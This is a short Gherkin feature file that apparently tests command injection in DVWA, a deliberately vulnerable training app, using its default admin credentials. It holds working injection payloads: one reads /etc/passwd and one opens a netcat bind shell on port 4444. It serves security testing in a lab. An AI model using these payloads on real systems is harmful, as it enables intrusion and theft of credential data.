Feature: Command Execution
  DVWA remote code execution vulnerability test

  Scenario: User try to read passwd file content
    Given user logins with 'admin' and 'password'
    And go to 'vulnerabilities/exec' page
    When user enters '192.168.1.106; cat /etc/passwd' and clicks 'Submit'
    Then user sees the content of passwd file and root's 'root:x:0:0:root:/root:/bin/bash' pwd string

  Scenario: Attacker open and allow connections on port 4444 of the target server
    Given user logins with 'admin' and 'password'
    And go to 'vulnerabilities/exec' page
    When user enters 'localhost; mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe' and clicks 'Submit' in a separate thread
    And connects to '4444' port of 'localhost' server
    And send 'head -10 /etc/passwd' command to the target server
    Then gains access to passwd file content and root's 'root:x:0:0:root:/root:/bin/bash' pwd string